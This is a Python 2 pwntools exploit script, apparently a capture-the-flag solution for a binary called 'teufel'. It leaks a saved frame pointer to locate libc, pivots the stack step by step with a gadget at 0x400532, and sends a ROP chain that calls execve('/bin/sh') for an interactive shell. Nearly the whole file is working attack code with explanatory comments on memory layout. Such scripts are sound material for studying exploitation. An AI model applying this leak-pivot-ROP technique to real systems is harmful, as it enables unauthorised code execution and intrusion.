# -*- coding: utf-8 -*-

# Based on <https://www.youtube.com/watch?v=wDosab_Y4Hs>

import sys
from pwn import *

def hexify(x):
    return ":".join("{:02x}".format(ord(c)) for c in x)

b = ELF('teufel')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = 'amd64'
context.log_level = 'info'

#r = remote('localhost', 8888)
r = process('./teufel')
gdb.attach(r, '''
b *0x400532
'''
)
#raw_input('Go!')

# strace: 
#
# mmap(NULL, 12288, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0) = 0x7fe593523000
# mprotect(0x7fe593524000, 4096, PROT_READ|PROT_WRITE) = 0

if __name__ == "__main__":

    payload = ""
    payload += p64(9)
    payload += p64(0xcafebabedeadbeef) 
    payload += "A" # overwrite NULL (unless puts() would terminate before the stored rbp)

    r.send(payload)
    resp = r.recv()

# start() stores the address of mmapped region at rbp (in fact, plus 0x2000)
# sub_4004E6() pushes rbp into the stack
# so we can leak the address with puts()
#
# 0xcafebabedeadbeef + 'A' + 
# ef:be:ad:de:be:ba:fe:ca:41: a0:ad:0f:93:7f: 0a

# leak rbp 

    mmap = resp[9:14]
    mmap = "\x00" + mmap + "\x00\x00"
    mmap = u64(mmap)

    mmap -= 0x2000

    log.info('mapped memory: %#x' % mmap)

# 0x5ea000 is from leak.py 

    LIBC_BASE = mmap - 0x5ea000
    log.info('LIBC_BASE: %#x' % LIBC_BASE)

    POP_RSI = libc.search(asm('pop rsi; ret')).next()
    POP_RDI = libc.search(asm('pop rdi; ret')).next()
    POP_RDX = libc.search(asm('pop rdx; ret')).next()
    BIN_SH = libc.search('/bin/sh').next()

    ORIGINAL_RSP = mmap + 0x2000

# $ ROPgadget --binary teufel
#
# 0x400532 : mov rsp, rbp; pop rbp; ret
#
# pmap `pidof tuefel`
#
# 00007f74d6fd7000 4K -----
# 00007f74d6fd8000 4K rw---
# 00007f74d6fd9000 4K ----- <--- initial RSP
#
# we don't have enough room to execute ROP.
# we have only 24 bytes. 
#
# read() buf    8 bytes
# saved RBP     8 bytes
# saved RIP     8 bytes
# ---------------------
# PROTO 0 memory region (no rw)
# ---------------------
#
# we can use the gadget to move down RSP just a little bit

    for i in xrange(0,10): # move down rsp by 0x10 at a time
        payload = p64(24)
        payload += p64(0x4004d7)
        payload += p64(ORIGINAL_RSP - 24 - 0x10*i - 8)
        payload += p64(0x400532)
        r.send(payload)

    r.clean()

    r.send(p64(5)) # health check. everything ok?
    r.send("babo\0")
    print r.recv()

    RSP = ORIGINAL_RSP - 0x10 * 10
    
    log.info("original RSP: %#x", ORIGINAL_RSP)
    log.info("new RSP: %#x", RSP)

    ROP = ""
    ROP += p64(LIBC_BASE + BIN_SH)
    ROP += p64(LIBC_BASE + POP_RSI)
    ROP += p64(0)
    ROP += p64(LIBC_BASE + POP_RDX)
    ROP += p64(0)
    ROP += p64(LIBC_BASE + libc.symbols['execve'])
    ROP += p64(LIBC_BASE + POP_RDI)
    ROP += p64(0)
    ROP += p64(LIBC_BASE + libc.symbols['_exit'])

    print "length of ROP: %d" % len(ROP)

    payload = ""
    payload += p64(0xcafebabedeadbeef)
    payload += p64(0)
    payload += p64(LIBC_BASE + POP_RDI )
    payload += ROP

    r.send(p64(len(payload)))
    r.send(payload)

    r.clean()

    r.interactive()
